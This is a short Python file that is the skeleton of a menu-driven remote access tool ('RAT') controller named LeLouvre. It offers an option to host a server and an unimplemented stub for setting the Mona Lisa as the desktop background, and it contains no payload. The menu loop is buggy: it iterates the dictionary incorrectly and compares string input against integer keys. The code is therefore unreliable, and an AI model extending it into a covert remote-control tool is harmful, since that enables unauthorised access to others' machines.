import server

class LeLouvre:
    def __init__(self):
        self.commands = {
            0: "Exit from RAT interface",
            1: "Run Server",
            2: "Set Mona Lisa as desktop background"
        }
        self.server = server.Server()

    """ Runs an interactive CLI RAT interface. """
    def run_rat_interface(self):
        while True:
            print("Le Louvre RAT Interface")
            for command, description in self.commands:
                print(command, "->", description)
            
            command_key = input()
            # Invalid input
            if command_key not in self.commands:
                continue
            # Exit program
            elif command_key == 0:
                return
            else:
                self.execute_command(command_key)

    """ Executes command based on the command key provided. """
    def execute_command(self, command_key):
        # Establish server for client connection
        if command_key == 1:
            self.server.host()
        # TODO: Set background to Mona Lisa
        elif command_key == 2:
            pass
            
if __name__=="__main__":
    le_louvre = LeLouvre()
    le_louvre.run_rat_interface()